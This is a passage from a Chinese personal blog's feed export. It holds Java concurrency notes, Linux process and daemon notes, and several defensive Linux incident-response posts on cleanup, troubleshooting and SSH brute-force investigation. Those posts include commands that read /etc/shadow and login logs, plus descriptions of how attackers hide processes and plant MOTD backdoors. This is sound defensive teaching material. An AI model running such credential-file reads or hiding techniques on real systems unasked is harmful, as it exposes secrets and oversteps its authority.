相同的并发性和内存语义，在实现线程安全的控制中较常用，可以显式加锁、释放锁。</p><p>使用示例：</p><pre class="line-numbers language-Java"><code class="language-Java">public void testMethod() &#123;    lock.lock();    try &#123;        System.out.println("xxxxxxxxxxxxxxxxx");    &#125; finally &#123;        lock.unlock();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Lock与Synchronized的比较"><a href="#Lock与Synchronized的比较" class="headerlink" title="Lock与Synchronized的比较"></a>Lock与Synchronized的比较</h3><ul><li>Lock是显式锁(手动开启和关闭锁，别忘记关闭锁)synchronized是隐式锁，出了作用域自动释放</li><li>Lock只有代码块锁，synchronized有代码块锁和方法锁使用Lock锁，JVM将花费较少的时间来调度线程，性能更好。并且具有更好的扩展性(提供更多的子类)</li><li><strong>优先使用顺序:</strong></li><li>Lock &gt;同步代码块 (已经进入了方法体，分配了相应资源)&gt;同步方法 (在方法体之外)</li></ul><h2 id="生产者消费者问题"><a href="#生产者消费者问题" class="headerlink" title="生产者消费者问题"></a>生产者消费者问题</h2><h3 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h3><p>  生产者和消费者共享同一个资源，并且生产者和消费者之间相互依赖，互为条件<br>  <strong>对于生产者：</strong>没有生产产品之前，要通知消费者等待而生产了产品之后，又需要马上通知消费者消费<br>  <strong>对于消费者：</strong>在消费之后，要通知生产者已经结束消费，需要生产新的产品以供消费</p><ul><li>synchronized 可阻止并发更新同一个共享资源，实现了同步</li><li>synchronized 不能用来实现不同线程之间的消息传递(通信)</li></ul><p>解决通信问题的方法，都是Obj类方法，只能在同步方法或者同步方法块内。</p><table><thead><tr><th>方法名</th><th>作用</th></tr></thead><tbody><tr><td>wait()</td><td>表示线程一直等待，直到其他线程通知，与sleep不同会释放锁</td></tr><tr><td>wait(long timeout)</td><td>指定等待的毫秒数</td></tr><tr><td>notify()</td><td>唤醒一个处于等待状态的线程</td></tr><tr><td>notifyAll()</td><td>唤醒同一个对象上所有调用wait()方法的线程，优先级别高的线程优先调度</td></tr></tbody></table><h3 id="管程法"><a href="#管程法" class="headerlink" title="管程法"></a>管程法</h3><p>  使用wait()和notify()方法的实现</p><p><strong>生产者:</strong> 负责生产数据的模块(可能是方法，对象，线程，进程)<br><strong>消费者:</strong> 负责处理数据的模块(可能是方法，对象，线程，进程)<br><strong>缓冲区:</strong> 生产者将生产好的数据放入缓冲区，消费者从缓冲区拿出数据</p><p>  缓冲区满或者空时都调用wait()方法等待，当生产者生产了一个产品或者消费者消费了一个产品之后会唤醒所有线程。</p><h3 id="可重入锁ReentrantLock的实现"><a href="#可重入锁ReentrantLock的实现" class="headerlink" title="可重入锁ReentrantLock的实现"></a>可重入锁ReentrantLock的实现</h3><p>  可重入锁，也叫做递归锁，指的是同一线程 外层函数获得锁之后，内层递归函数仍然有获取该锁的代码，但不受影响。<br>  锁维护一个与获取锁相关的计数器，如果拥有锁的某个线程再次得到锁，那么获取计数器就加1，函数调用结束计数器就减1。<br>  锁需要被释放两次才能获得真正释放，已经获取锁的线程进入其他需要相同锁的同步代码块不会被阻塞。</p><h3 id="阻塞队列BlockingQueue的实现"><a href="#阻塞队列BlockingQueue的实现" class="headerlink" title="阻塞队列BlockingQueue的实现"></a>阻塞队列BlockingQueue的实现</h3><p>  BlockinoQueue是一个已经在内部实现了同步的队列，实现方式采用的是await()/signal()方法。它可以在生成对象时指定容量大小，用于阻塞操作的是put()和take()方法。<br>put()方法: 类似于我们上面的生产者线程，容量达到最大时，自动阻塞。<br>take(方法: 类似于我们上面的消费者线程，容量为0时，自动阻寒。<br>  当一个线程对已经满了的阻塞队列进行入队操作时会阻塞，除非有另外一个线程进行了出队操作，当一个线程对一个空的阻塞队列进行出队操作时也会阻塞，除非有另外一个线程进行了入队操作。<br>从上可知，阻塞队列是线程安全的。</p><h3 id="信号量-Semaphore-的实现"><a href="#信号量-Semaphore-的实现" class="headerlink" title="信号量 Semaphore 的实现"></a>信号量 Semaphore 的实现</h3><p>  Semaphore是一种基于计数的信号量，它可以设定一个阀值。<br>  当多个线程竞争获取许可信号，做完自己的申请后归还，超过闻值后，线程申请许可信号将会被阻塞。<br>  Semaphore可以用来构建一些对象池，资源池之类的，比如数据库连接池，我们也可以创建计数为的Semaphore，将其作为一种类似互斥锁的机制，这也叫二元信号量，表示两种互斥状态。<br>  计数为0的Semaphore是可以release的，然后就可以acquire (即一开始使线程阻塞从而完成其他执行)。</p><h3 id="管道输入输出流实现"><a href="#管道输入输出流实现" class="headerlink" title="管道输入输出流实现"></a>管道输入输出流实现</h3><p>  先创建一个管道输入流和管道输出流，然后将输入流和输出流进行连接<br>  用生产者线程往管道输出流中写入数据，消费者在管道输入流中读取数据，这样就可以实现了不同线程间的相互通讯<br>  但是这种方式在生产者和生产者、消费者和消费者之间不能保证同步，也就是说在一个生产者和一个消费者的情况下是可以生产者和消费者之间交替运行的，多个生成者和多个消费者者之间则不行</p><h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><p>  <strong>背景:</strong> 经常创建和销毁、使用量特别大的资源，比如并发情况下的线程，对性能影响很大。<br>  <strong>思路:</strong> 提前创建好多个线程，放入线程池中，使用时直接获取，使用完放回池中可以避免频繁创建销毁、实现重复利用。<br><strong>好处:</strong></p><ol><li>提高响应速度(减少了创建新线程的时间)</li><li>降低资源消耗(重复利用线程池中线程，不需要每次都创建)</li><li>便于线程管理<br><code>corePoolSize</code>: 核心池的大小<br><code>maximumPoolSize</code>: 最大线程数<br><code>keepAliveTime</code>: 线程没有任务时最多保持多长时间后会终止</li></ol><pre class="line-numbers language-Java"><code class="language-Java">private static void createCachedThreadPool() &#123;        ExecutorService executorService = Executors.newCachedThreadPool();  // 可缓存的线程池，若线程数超过处理所需，缓存一段时间后会回收，若线程数不够，则新建线程。        ExecutorService executorService = Executors.newFixedThreadPool(3);  // 固定大小的线程池，可控制并发的线程数，超出的线程会在队列中等待。        ScheduledExecutorService executorService = Executors.newScheduledThreadPool(3);  // 周期性的线程池，支持定时及周期性执行任务。        ExecutorService executorService = Executors.newSingleThreadExecutor();  // 单线程的线程池，可保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。        //   使用ThreadPoolExecutor自行定义线程池        for (int i = 0; i < 10; i++) &#123;            final int index = i;            executorService.execute(() -> &#123;                // 获取线程名称,默认格式:pool-1-thread-1                System.out.println(DateUtil.now() + " " + Thread.currentThread().getName() + " " + index);                // 等待2秒                sleep(2000);            &#125;);        &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  应该使用ThreadPoolExecutor类来创建线程池，根据自己需要的场景来创建一个合适的线程池。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  很尴尬这是这个学期的第一篇博客文章，有一种一个学期没学啥东西的感觉<br><strong>orz</strong>能鸽这么久确实是没想到<br>  接下来可能会整一些java的东西，然后有计划写算法或者安全开发这些东西。</p><p><a href="https://smms.app/image/hDei8vSbxJVIqto" target="_blank"><img src="https://s2.loli.net/2023/12/14/hDei8vSbxJVIqto.jpg" width = "500" ></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://smms.app/image/OWJiKn1hyEl3F9P&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://s2.loli.net/2023/12/14/OWJiKn1hyEl3F9P.png&quot; &gt;&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Linux进程简述</title>
    <link href="https://liu1272.github.io/2023/08/19/Linux%E8%BF%9B%E7%A8%8B%E7%AE%80%E8%BF%B0/"/>
    <id>https://liu1272.github.io/2023/08/19/Linux%E8%BF%9B%E7%A8%8B%E7%AE%80%E8%BF%B0/</id>
    <published>2023-08-19T12:39:00.000Z</published>
    <updated>2023-09-28T12:21:12.921Z</updated>
    
    <content type="html"><![CDATA[<h5 id="父进程"><a href="#父进程" class="headerlink" title="父进程"></a>父进程</h5><p>自已创建一个或者多个进程</p><h4 id="子进程"><a href="#子进程" class="headerlink" title="子进程"></a>子进程</h4><p>fork创建的。这个函数被调用一次但是返回两次，子进程返回0，父进程返回子进程id。</p><pre><code>fork之后，操作系统会赋值一个与父进程完全相同的子进程，虽然是父子关系，但是更像是兄弟关系。这两个进程共享代码，但是数据空间是互相独立的，数据空间、指令、指针完全相同，子进程拥有当前父进程运行到的位置（PC相同）。</code></pre><h4 id="进程组"><a href="#进程组" class="headerlink" title="进程组"></a>进程组</h4><p>多个进程的集合，其中有一个组长，PID等于进程组的PGID，只要这个组里面有一个进程存在那么这个组就存在，与组长进程是否终止无关</p><h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4><p>shell分前后台来控制的不是进程而是作业或者进程组。<br>一个前台作业由多个进程组成，一个后台也由多个进程组成。<br>shell可以运行一个前台作业和任意多个后台作业。这就是作业控制。</p><pre><code>为什么只能运行一个前台作业？前台作业是指当前终端窗口中运行的作业，而一个后台作业则是在后台运行的作业，不会占用当前终端窗口。一个终端窗口只能有一个前台作业，是因为终端窗口只能和一个进程交互，用户在终端窗口输入命令，终端窗口会将命令传递给前台作业，如果有多个作业同时处于前台，那么输入的命令将被发送给哪个作业时不确定的，这会导致混乱和错误。</code></pre><h4 id="作业与进程组的区别"><a href="#作业与进程组的区别" class="headerlink" title="作业与进程组的区别"></a>作业与进程组的区别</h4><p>如果作业中有某个进程创建了子进程，则这个子进程是不属于该作业的，一旦作业运行结束，shell就把自己提到前台（子进程还在，但是子进程不属于作业）。如果原来的前台进程还存在（这个子进程还没有终止），他将自动变为后台进程组。</p><pre><code>当我们在前台新起了一个作业，shell就被提到了后台，因此shell就没有办法再继续接受我们的指令并且解析运行了。 但是如果前台进程退出了，shell就会有被提到前台来，就可以继续接受我们的命令并且解析运行。</code></pre><h4 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h4><p>是一个躲着多个进程组的集合。一个会话有一个控制终端，在xshell或者winscp中打开一个窗口就是新建一个会话。</p><h4 id="孤儿进程"><a href="#孤儿进程" class="headerlink" title="孤儿进程"></a>孤儿进程</h4><p>如果父进程退出，子进程还没有退出，那些子进程将成为孤儿进程。<br>孤儿进程被1号进程init进程收养。那么子进程的父进程将变成init进程。由init进程对他们完成状态收集工作。</p><h4 id="僵尸进程"><a href="#僵尸进程" class="headerlink" title="僵尸进程"></a>僵尸进程</h4><p>在操作系统中，当一个进程终止时，它的状态信息仍然被保留在系统中，直到其父进程调用wait或waitpid等系统调用来获取其终止状态信息。<br>如果父进程没有及时调用这些系统调用来获取终止状态信息，那么这个已经终止的子进程就会成为一个僵尸进程。<br>僵尸进程占用了系统资源，因为它们仍然占用了进程ID、进程表项和一些其他资源，而这些资源可能需要被其他进程使用。</p><pre><code>Linux中，使用ps aux查看信息，发现僵尸进程状态为“Z”</code></pre><p>当一个进程终止时，如果它的子进程仍然处于僵尸状态，那么这些子进程的父进程ID将被重置为1，也就是init进程。此时，init进程会调用wait或waitpid等系统调用来获取这些子进程的终止状态信息，并清除它们的僵尸状态，从而释放系统资源。</p><h4 id="进程终止的几种方式"><a href="#进程终止的几种方式" class="headerlink" title="进程终止的几种方式"></a>进程终止的几种方式</h4><pre><code>main函数自然返回exit，属于C函数库_exit，属于系统调用调用abort函数，异常程序终止，同时发送SIGABRT信号给调用进程接收能导致进程终止的信号 ctrl+c，SIGINT</code></pre><h4 id="如何让进程后台运行"><a href="#如何让进程后台运行" class="headerlink" title="如何让进程后台运行"></a>如何让进程后台运行</h4><pre><code>命令后面加上&amp;，这样是将命令放入到一个作业队列中ctrl+z挂起进程，使用jobs查看序号，再使用bg%序号后台运行进程nohup+&amp;，将标准输出和标准错误缺省会被重定向到nohup文件中，忽略所有SIGHUP挂断信号运行指令前面加上 setsid，使其父进程编程init进程，不受HUP信号影响将命令+&amp;放在（）括号中，也可以是进程不受HUP信号影响</code></pre><h4 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h4><p>指在后台运行的，没有控制终端与之相连的进程。<br>它独立于控制终端，周期性的执行某种任务。<br>Linux大多数服务器就是用守护进程的方式实现的，比如WEB服务器。<br>通过ps –x -j以查看作业控制信息，其中TPGID一栏为-1就是守护进程<br>特点：</p><ol><li>随系统启动而启动</li><li>父进程是init，也就是ppid为1</li><li>在后台运行</li><li>进程名字通常以字母 d 结束</li><li>ps显示中终端名设置为问号(?)，终端前台进程组ID设置为-1</li><li>工作目录为 \ (根)</li></ol><h4 id="创建守护进程"><a href="#创建守护进程" class="headerlink" title="创建守护进程"></a>创建守护进程</h4><ul><li>让程序在后台执行：调用fork()产生一个子进程，然后使父进程退出</li><li>调用setsid（）创建一个新对话期。控制终端、登录会话和进程组通常是从父进程进程下来的，守护进程要摆脱他们，不受他们的影响，方法是调用setsid()使进程成为一个会话组长。</li><li>禁止进程重新申请打开控制终端。通过使进程不再是会话组长来实现。再一次通过fork创建新的子进程，使调用fork的进程退出。</li><li>关闭不再需要的文件描述符。首先获得最高文件描述符值，然后用一个循环程序，关闭0到最高文件描述符值的所有文件描述符。</li><li>将当前目录更改为根目录</li><li>子进程从父进程继承的文件创建屏蔽字可能会拒绝某些许可权。为防止这一点，使用unmask(0)将屏蔽字清零。</li><li>将SIGCHLD信号的操作设置为SIG_IGN，子进程结束的时候就不会产生僵尸进程。</li></ul><h4 id="守护进程与后台进程"><a href="#守护进程与后台进程" class="headerlink" title="守护进程与后台进程"></a>守护进程与后台进程</h4><p>后台进程的文件描述符是继承于父进程，例如shell，所以它也可以在当前终端下显示输出数据。<br>但是deemon进程自己变成了进程组长，其文件描述符号和控制终端没有关联，是控制台无关的。<br>基本上任何一个程序都可以后台运行，但守护进程是具有特殊要求的程序，比如要脱离自己的父进程，成为自己的会话组长等，这些要在代码中显式地写出来<br>所以<code>守护进程是后台进程的一种</code>。<br>前台任务会随着session的退出而退出是因为它收到了SIGHUP信号。<br>后台任务是否会受到SIGNUP信号，取决于shell的<code> huponexit </code>参数。可以通过<code> $ shopt | grep huponexit </code>查看该参数的值。</p><h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><p>一般讨论的都是shell session，我们打开一个新的终端就会创建一个session<br>每个session都是由一个或者多个进程组组成的，每个进程组称为 job，这里job不是任务，而叫作业。<br>调用 setsid() 函数可以生成新的session,那么这些命令可以通过session进行统一管理<br>session中的第一个进程 (一般是bash) 的PID就是session的SID</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;父进程&quot;&gt;&lt;a href=&quot;#父进程&quot; class=&quot;headerlink&quot; title=&quot;父进程&quot;&gt;&lt;/a&gt;父进程&lt;/h5&gt;&lt;p&gt;自已创建一个或者多个进程&lt;/p&gt;
&lt;h4 id=&quot;子进程&quot;&gt;&lt;a href=&quot;#子进程&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>善后处理</title>
    <link href="https://liu1272.github.io/2023/08/18/%E5%96%84%E5%90%8E%E5%A4%84%E7%90%86/"/>
    <id>https://liu1272.github.io/2023/08/18/%E5%96%84%E5%90%8E%E5%A4%84%E7%90%86/</id>
    <published>2023-08-18T02:34:00.000Z</published>
    <updated>2023-08-19T09:16:25.153Z</updated>
    
    <content type="html"><![CDATA[<h5 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h5><pre><code>top d1   //运行top命令后，键入大写字母P按cpu排序ps aux | sort -k4nr   //运行top命令后，键入大写字母M按内存排序ls -la /proc/$pid/exe   //查找进程文件strace -tt  -T -e  trace=all  -p $pid   //跟踪进程运行lsof -p $pid   //进程打开的文件netstat -anltp | grep $pid   //查看进程端口情况</code></pre><h5 id="查看账号"><a href="#查看账号" class="headerlink" title="查看账号"></a>查看账号</h5><pre><code>awk -F &quot;:&quot; &#39;$3==0&#123;print $1&#125;&#39; /etc/passwd   //查看特权用户awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow   //可远程登录的账号信息cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;   //sudo的账号w   //当前用户及其行为lastlog   //所有用户最后登录时间last   //所有用户关键信息grep &quot;Accepted &quot; /var/log/secure* | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;   //成功登录日期、用户名及ip//查看试图爆破主机的ipgrep refused /var/log/secure* | awk &#123;&#39;print $9&#39;&#125; | sort | uniq -c |sort -nr | moregrep &quot;Failed password&quot; /var/log/secure* | grep -E -o &quot;(([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;))&quot; | uniq -c grep &quot;Failed password for root&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; | sort   //查看爆破root的ipgrep &quot;Failed password&quot; /var/log/secure | awk &#123;&#39;print $9&#39;&#125; | sort | uniq -c | sort -nr   //查看爆破的用户名字典</code></pre><h5 id="锁定目录"><a href="#锁定目录" class="headerlink" title="锁定目录"></a>锁定目录</h5><pre><code>chmod 000 /usr/bin/风险目录chattr +i /usr/binchattr +i /binchattr +i /tmp</code></pre><h5 id="检查异常文件"><a href="#检查异常文件" class="headerlink" title="检查异常文件"></a>检查异常文件</h5><pre><code>【检查特权文件】find / -perm /6000find / -perm /4000find / -perm /2000【检查corn文件】/var/spool/cron/*/etc/crontab /etc/cron.d/* /etc/cron.daily/*/etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab     /var/spool/anacron/*【最近被修改的系统文件】find /etc/ /usr/bin/ /usr/sbin/ /bin/ /usr/local/bin/  -type f -mtime -T | xargs ls -la【被替换的命令/动态链接库劫持】echo $LD_PRELOADecho $LD_LIBRARY_PATH注：基本上上面两个命令回显是空白的，如果有回显大概率是被劫持ls -alt /usr/bin /usr/sbin /bin /usr/local/binrpm -Va&gt;rpm.log</code></pre><h5 id="删除计划任务等"><a href="#删除计划任务等" class="headerlink" title="删除计划任务等"></a>删除计划任务等</h5><pre><code>rm -f /etc/init.d/风险目录rm -f /etc/rc#.d/木马连接文件cat /etc/rc.local   //开机启动项chkconfig --list   //开机启动项注意：建议使用vim查看，cat有可能显示不全</code></pre><h5 id="rootkit查杀"><a href="#rootkit查杀" class="headerlink" title="rootkit查杀"></a>rootkit查杀</h5><p>rootkit主要有两种类型：文件级别和内核级别。<br>文件级别的rootkit: 一般是通过程序漏洞或者系统漏洞进入系统后，通过修改系统的重要文件来达到隐藏自己的目的。<br>内核级rootkit: 是比文件级rootkit更高级的一种入侵方式，它可以使攻击者获得对系统底层的完全控制权，此时攻击者可以修改系统内核，进而截获运行程序向内核提交的命令，并将其重定向到入侵者所选择的程序并运行此程序。内核级rootkit主要依附在内核上，它并不对系统文件做任何修改。以防范为主。<br><strong>查杀工具：</strong><br><a href="http://www.chkrootkit.org/"> chkrootkit </a>、<a href="http://rkhunter.sourceforge.net/"> rkhunter </a>、<a href="http://www.clamav.net/download.html"> ClamAV </a></p><h5 id="其它检查方面"><a href="#其它检查方面" class="headerlink" title="其它检查方面"></a>其它检查方面</h5><ul><li>BASH内置命令<pre><code>compgen -b</code></pre></li><li>BASH函数<pre><code>compgen -funset -f functionName</code></pre></li><li>环境变量<pre><code>envsetexportcat /proc/$PID/environdeclare</code></pre></li><li>SSH key</li><li>SSH config文件<pre><code>/etc/ssh/ssh_config 和 ~/.ssh/config将LocalCommand 和 ProxyCommand 参数封禁</code></pre></li><li>alias命令替换<pre><code>alias 命令的功能是为命令设置别名alert   //检查是否存在替换unalias alert   //删除别名</code></pre></li><li>DNS配置文件<pre><code>/etc/resolv.conf</code></pre></li><li>禁止ptrace_scope操作<pre><code>cat /proc/sys/kernel/yama/ptrace_scope</code></pre></li><li>ASLR<pre><code>cat /proc/sys/kernel/randomize_va_space   //调成2减缓溢出攻击</code></pre></li><li>capabilities<pre><code>getcap -r / 2&gt;/dev/null   //查看对权限的默认情况setcap   //重新设置权限</code></pre></li><li> iptables端口复用<pre><code>sudo iptables -L   //查看默认情况</code></pre></li><li>密码填充检查<pre><code>cat /etc/passwd | cut -d &quot;:&quot; -f 2 | grep -v &quot;x   //默认情况应该是空的</code></pre></li><li>服务检查<pre><code>sudo systemctl list-units --type=service --state=running   //正在运行的服务systemctl status xxx.service   //查看单一服务进程状态systemctl cat xxx.service   //获取服务配置文件systemctl cat </code></pre></li><li>MOTD<pre><code>是Linux中发送问候消息的功能，一般在我们登录服务器后显示每次任意用户登录时都会触发 motd 服务的功能,这个功能的脚本几乎都是使用 root 权限来启动的，所以很适合用来做后门</code></pre></li><li>进程启动文件<pre><code>恶意程序执行后，可能会删除本地文件，但是该文件已经被进程加载，可以通过遍历这种情况来排查恶意程序sudo lsof | grep deletedsudo ls -al /proc/*/exe 2&gt;/dev/null | grep deleted   //建议使用这一个命令</code></pre></li><li>检查系统及应用程序配置文件</li><li>sudo配置文件检查<pre><code>/etc/sudo.conf/etc/sudoers/etc/sudoers.d/</code></pre></li><li>第三方GPG密钥检查<br>```<br>sudo apt-key list<br>具体存储⽬录为 /etc/apt/trusted.gpg.d/</li></ul><p>gpg –quiet –show-keys /etc/pki/rpm-gpg/*<br>具体存储⽬录为 /etc/pki/rpm-gpg/<br>```</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;杀死进程&quot;&gt;&lt;a href=&quot;#杀死进程&quot; class=&quot;headerlink&quot; title=&quot;杀死进程&quot;&gt;&lt;/a&gt;杀死进程&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;top d1   //运行top命令后，键入大写字母P按cpu排序

ps aux | sort -k4nr</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>常见问题处置方案</title>
    <link href="https://liu1272.github.io/2023/08/17/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E5%A4%84%E7%BD%AE%E6%96%B9%E6%A1%88/"/>
    <id>https://liu1272.github.io/2023/08/17/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E5%A4%84%E7%BD%AE%E6%96%B9%E6%A1%88/</id>
    <published>2023-08-17T08:08:00.000Z</published>
    <updated>2023-09-28T08:01:14.319Z</updated>
    
    <content type="html"><![CDATA[<h5 id="文件无法删除"><a href="#文件无法删除" class="headerlink" title="文件无法删除"></a>文件无法删除</h5><p><strong>被进程占用：</strong></p><pre><code>lsof xxxx.xx</code></pre><p><strong>文件存在隐藏属性：</strong></p><pre><code>sattr xxxx.xxchattr -a xxxx.xxchattr -i xxxx.xx</code></pre><p><strong>上层文件存在SBIT权限：</strong><br>这种情况只存在于非 root 权限去删除其他用户创建的目录的情况，即使文件权限是 777 也无法进行删除。<br>当目录被设置了粘滞位权限以后，即便用户对该目录有写入权限，也不能删除该目录中其他用户的文件数据，而是只有该文件的所有者和root用户才有权将其删除。<br>这种办法可以保持一种动态的平衡：允许各用户在目录中任意写入、删除数据，但是禁止随意删除其他用户的数据。<br>需要注意的是，粘滞位权限只能针对目录设置，对于文件无效。<br>设置了粘滞位权限的目录，使用ls命令查看其属性时，其他用户权限处的“x”将变为“t”。<br>粘滞位权限都是针对其他用户设置，使用chmod命令设置目录权限时，“o+t”、“o-t”权限模式可分别用于添加、移除粘滞位权限。</p><h5 id="netstat-pantu-不显示-pid-而显示"><a href="#netstat-pantu-不显示-pid-而显示" class="headerlink" title="netstat -pantu 不显示 pid  而显示 -"></a>netstat -pantu 不显示 pid  而显示 -</h5><p>可能是使用了<code>mkdir .hidden  或者  mount -o bind .hidden /proc/PID</code>来隐藏</p><pre><code>cat /proc/$$/mountinfo   //查询挂载信息umount /proc/PID   //取消挂载</code></pre><h5 id="ps和top看不到恶意进程"><a href="#ps和top看不到恶意进程" class="headerlink" title="ps和top看不到恶意进程"></a>ps和top看不到恶意进程</h5><ol><li>挂载被隐藏（看上一个的操作）</li><li>命令被替换（使用busybox进行检修）</li><li>LD_PRELOAD等方法共享库劫持（使用busybox进行检修）</li></ol><h5 id="快速查找文件"><a href="#快速查找文件" class="headerlink" title="快速查找文件"></a>快速查找文件</h5><p>【which】<br>从环境变量查找系统命令的具体文件位置<br>【whereis】<br>从/usr目录快速查找文件<br>【locate】<br>从locatedb数据库查找文件路径<br>【find】<br>强大的搜索命令<br><code>find &lt;检索路径&gt; &lt;选项&gt; &lt;搜索内容&gt;</code><br><a href="https://cloud.tencent.com/developer/article/1348438">具体使用方法</a></p><h5 id="确定系统信息"><a href="#确定系统信息" class="headerlink" title="确定系统信息"></a>确定系统信息</h5><pre><code>cat /etc/issue   //系统版本uname -mgetconf LONG_BIT   //查看系统位数cat /proc/version   //查看内核版本uname -a</code></pre><h5 id="系统完整性检测"><a href="#系统完整性检测" class="headerlink" title="系统完整性检测"></a>系统完整性检测</h5><pre><code>rpm -Va   //Centosapt install debsums   //Ubuntu、Debiandebsums --all --changed</code></pre><h5 id="系统文件监控工具"><a href="#系统文件监控工具" class="headerlink" title="系统文件监控工具"></a>系统文件监控工具</h5><pre><code>AIDE\inotify\tripwire</code></pre><h5 id="查看glibc版本"><a href="#查看glibc版本" class="headerlink" title="查看glibc版本"></a>查看glibc版本</h5><pre><code>ldd --version</code></pre><h5 id="误删文件恢复"><a href="#误删文件恢复" class="headerlink" title="误删文件恢复"></a>误删文件恢复</h5><pre><code>被删除的文件在进程的内存空间还保存着一份，可以通过访问某个目录来找到文件恢复如果正在进行读写操作：lsof   //查找进程文件恢复即可mount   //查看所有挂载点umount   //删除挂载点lsblk -f   //查看所有设备的挂载情况df -T 路径   //可查看该路径的所属挂载点、所在分区、所在分区的文件系统类型cat /proc/filesystems   //查看文件系统的类型常用恢复工具有：Extundelete、Debugfs、R-Linux、Ext3grep、Ext4magic</code></pre><h5 id="批量检索文件并打印信息"><a href="#批量检索文件并打印信息" class="headerlink" title="批量检索文件并打印信息"></a>批量检索文件并打印信息</h5><pre><code>find / -name &quot;内容&quot; | while read line; do if [ -f $line ]; then ls -al $line; elif [ -d $line ]; then ls -al ../ | grep $line; fi; done</code></pre><h5 id="拷贝取证"><a href="#拷贝取证" class="headerlink" title="拷贝取证"></a>拷贝取证</h5><ol><li>使用虚拟化平台存储快照</li><li>打包整个系统</li><li>全盘拷贝（推荐 clonezilla）</li><li>进程拷贝（推荐 CRIU）</li><li>组合运用（冻结进程 + 全盘拷贝 + 恢复进程）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;文件无法删除&quot;&gt;&lt;a href=&quot;#文件无法删除&quot; class=&quot;headerlink&quot; title=&quot;文件无法删除&quot;&gt;&lt;/a&gt;文件无法删除&lt;/h5&gt;&lt;p&gt;&lt;strong&gt;被进程占用：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;lsof xxxx.xx
&lt;/</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>暴力破解排查</title>
    <link href="https://liu1272.github.io/2023/08/16/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%8E%92%E6%9F%A5/"/>
    <id>https://liu1272.github.io/2023/08/16/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%8E%92%E6%9F%A5/</id>
    <published>2023-08-16T07:40:00.000Z</published>
    <updated>2023-08-19T09:16:10.557Z</updated>
    
    <content type="html"><![CDATA[<h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><p>暴力破解一般针对<br>ssh、mysql、ftp、redis、mongodb、smtp</p><h5 id="SSH暴力破解"><a href="#SSH暴力破解" class="headerlink" title="SSH暴力破解"></a>SSH暴力破解</h5><ol><li><p>使用<code>netstat -pantu</code>查看网络状态，重点是PID（当被破解时会有大量的ESTABLISHED）</p></li><li><p>使用<code>awk -F: &#39;&#123;if($3==0) print $1&#125;&#39; /etc/passwd</code>查找特殊权限账号（默认root）</p></li><li><p>查找可以使用ssh登录的账号</p><pre><code>s=$( sudo cat /etc/shadow | grep &#39;^[^:]*:[^\*!]&#39; | awk -F: &#39;&#123;print $1&#125;&#39;);for i in $s;do cat/etc/passwd | grep -v &quot;/bin/false\|/nologin&quot;| grep $i;done | sort | uniq |awk -F: &#39;&#123;print$1&#125;&#39;</code></pre></li><li><p>查看正在连接的ssh-session</p><pre><code>who -awlast -p nowsudo netstat -tnpa | grep &#39;ESTABLISHED.*sshd&#39;pgrep -af sshdecho $SSH_CONNECTIONss | grep ssh</code></pre></li><li><p>查看所有的账号信息</p><pre><code>/var/log/auth.log（Ubuntu）/var/log/secure（centOS）列出当前账户         who am i  </code></pre></li><li><p>查看登录日志</p><pre><code># 查看日志cd /var/log# 成功登录cat /var/log/auth.log | grep &quot;Accept&quot;# 正常退出cat 